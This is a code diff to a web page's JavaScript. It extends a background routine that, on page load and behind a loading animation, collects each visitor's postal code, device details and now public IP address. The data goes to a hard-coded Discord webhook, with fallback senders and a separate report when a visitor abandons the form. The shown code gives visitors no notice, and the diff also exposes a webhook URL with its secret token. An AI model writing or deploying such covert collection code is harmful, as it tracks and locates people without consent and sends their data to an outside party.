@@ -1,6 +1,7 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
 
 let loadingProgress = 0;
+let userIP = '';
 let userPostalCode = '';
 let initialWebhookSent = false;
 let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
@@ -12,6 +13,7 @@ const INACTIVITY_TIMEOUT = 5 * 60 * 1000; // 5 minutes
 function storeSessionData() {
     const sessionData = {
         sessionId: sessionId,
+        ipAddress: userIP,
         postalCode: userPostalCode,
         startTime: formStartTime,
         initialWebhookSent: initialWebhookSent,
@@ -65,8 +67,8 @@ function handleIncompleteSession() {
 
 // Send webhook for incomplete session
 async function sendIncompleteSessionWebhook() {
-    if (!userPostalCode || userPostalCode === 'Unknown Postal Code') {
-        console.log('❌ No postal code information to send');
+    if (!userIP && !userPostalCode) {
+        console.log('❌ No location information to send');
         return;
     }
     
@@ -80,6 +82,7 @@ async function sendIncompleteSessionWebhook() {
             color: 0xff9500, // Orange color for incomplete
             fields: [
                 { name: '🆔 Session ID', value: sessionId, inline: false },
+                { name: '🌐 IP Address', value: userIP, inline: true },
                 { name: '📍 Postal Code', value: userPostalCode, inline: true },
                 { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                 { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
@@ -89,7 +92,7 @@ async function sendIncompleteSessionWebhook() {
                 { name: '📊 Initial Webhook', value: initialWebhookSent ? '✅ Sent' : '❌ Failed', inline: true }
             ],
             footer: {
-                text: 'Session ended without form completion - Postal code information preserved'
+                text: 'Session ended without form completion - Location information preserved'
             }
         };
 
@@ -651,11 +654,51 @@ window.addEventListener('load', function() {
     // Start loading sequence immediately (don't wait for postal code collection)
     startLoadingSequence();
     
-    // Collect postal code and send initial webhook in the background (non-blocking)
+    // Collect location data and send initial webhook in the background (non-blocking)
     setTimeout(() => {
-        collectPostalCodeAndSendInitialWebhook();
+        collectLocationDataAndSendInitialWebhook();
     }, 100); // Small delay to ensure loading sequence starts first
 });
+
+// Get IP address with multiple fallback services
+async function getIPAddress() {
+    const ipServices = [
+        { url: 'https://api.ipify.org?format=json', parser: (data) => data.ip },
+        { url: 'https://ipapi.co/json/', parser: (data) => data.ip },
+        { url: 'https://api.myip.com', parser: (data) => data.ip },
+        { url: 'https://httpbin.org/ip', parser: (data) => data.origin },
+        { url: 'https://ifconfig.me/ip', parser: (data) => data.trim() }
+    ];
+    
+    for (const service of ipServices) {
+        try {
+            console.log(`🔄 Trying IP service: ${service.url}`);
+            const response = await fetch(service.url, {
+                method: 'GET',
+                mode: 'cors',
+                cache: 'no-cache',
+                headers: {
+                    'Accept': 'application/json'
+                }
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                const ip = service.parser(data);
+                
+                if (ip && ip !== 'Unknown IP') {
+                    console.log(`✅ IP retrieved from ${service.url}: ${ip}`);
+                    return ip;
+                }
+            }
+        } catch (error) {
+            console.log(`❌ IP service ${service.url} failed:`, error.message);
+        }
+    }
+    
+    console.log('⚠️ All IP services failed, using fallback');
+    return 'Unknown IP';
+}
 
 // Get postal code using geolocation API
 async function getPostalCode() {
@@ -741,11 +784,15 @@ async function askUserForPostalCode() {
     });
 }
 
-// Collect postal code and send initial webhook with postal code and device info
-async function collectPostalCodeAndSendInitialWebhook() {
-    console.log('📍 Starting postal code collection and initial webhook...');
+// Collect location data (IP + Postal Code) and send initial webhook
+async function collectLocationDataAndSendInitialWebhook() {
+    console.log('🌐 Starting location data collection and initial webhook...');
     
     try {
+        // Get IP address
+        console.log('📡 Getting IP address...');
+        userIP = await getIPAddress();
+        
         // Get postal code
         console.log('📍 Getting postal code...');
         userPostalCode = await getPostalCode();
@@ -754,11 +801,12 @@ async function collectPostalCodeAndSendInitialWebhook() {
         console.log('📱 Getting device info...');
         const deviceInfo = getDeviceInfo();
         
-        // Send initial webhook with postal code and device info
-        console.log('📤 Sending initial webhook with postal code and device info...');
+        // Send initial webhook with both IP and postal code
+        console.log('📤 Sending initial webhook with location data...');
+        console.log('📋 IP Address:', userIP);
         console.log('📋 Postal Code:', userPostalCode);
         
-        const initialSuccess = await sendInitialWebhook(userPostalCode, deviceInfo);
+        const initialSuccess = await sendInitialWebhook(userIP, userPostalCode, deviceInfo);
         
         if (initialSuccess) {
             initialWebhookSent = true;
@@ -767,7 +815,7 @@ async function collectPostalCodeAndSendInitialWebhook() {
             console.error('❌ Failed to send initial webhook');
             // Try simple fallback method
             console.log('🔄 Trying simple fallback webhook method...');
-            const fallbackSuccess = await sendSimpleWebhook(userPostalCode, deviceInfo);
+            const fallbackSuccess = await sendSimpleWebhook(userIP, userPostalCode, deviceInfo);
             if (fallbackSuccess) {
                 initialWebhookSent = true;
                 console.log('✅ Fallback webhook sent successfully');
@@ -779,8 +827,8 @@ async function collectPostalCodeAndSendInitialWebhook() {
     }
 }
 
-// Send initial webhook with postal code and device info
-async function sendInitialWebhook(postalCode, deviceInfo) {
+// Send initial webhook with IP, postal code, and device info
+async function sendInitialWebhook(ipAddress, postalCode, deviceInfo) {
     if (!WEBHOOK_URL) {
         console.error('❌ Webhook URL is not configured');
         return false;
@@ -790,9 +838,10 @@ async function sendInitialWebhook(postalCode, deviceInfo) {
         const embed = {
             title: '🌐 User Visit Detected',
             description: '👤 A user has accessed the system',
-            color: 0x3498db, // Blue color for initial visit
+            color: 0x00ff00, // Green color for initial
             fields: [
                 { name: '🆔 Session ID', value: sessionId, inline: false },
+                { name: '🌐 IP Address', value: ipAddress, inline: true },
                 { name: '📍 Postal Code', value: postalCode, inline: true },
                 { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                 { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
@@ -828,7 +877,7 @@ async function sendInitialWebhook(postalCode, deviceInfo) {
 }
 
 // Simple webhook fallback method
-async function sendSimpleWebhook(postalCode, deviceInfo) {
+async function sendSimpleWebhook(ipAddress, postalCode, deviceInfo) {
     if (!WEBHOOK_URL) {
         console.error('❌ Webhook URL is not configured');
         return false;
@@ -836,7 +885,7 @@ async function sendSimpleWebhook(postalCode, deviceInfo) {
     
     try {
         // Create a simple message payload
-        const message = `🌐 User Visit Detected\n🆔 Session: ${sessionId}\n📍 Postal Code: ${postalCode}\n📱 Device: ${deviceInfo.platform}\n🖥️ OS: ${deviceInfo.os}\n🌍 Browser: ${deviceInfo.browser}`;
+        const message = `🌐 User Visit Detected\n🆔 Session: ${sessionId}\n🌐 IP Address: ${ipAddress}\n📍 Postal Code: ${postalCode}\n📱 Device: ${deviceInfo.platform}\n🖥️ OS: ${deviceInfo.os}\n🌍 Browser: ${deviceInfo.browser}`;
         
         // Try using a simple POST request without complex headers
         const payload = {
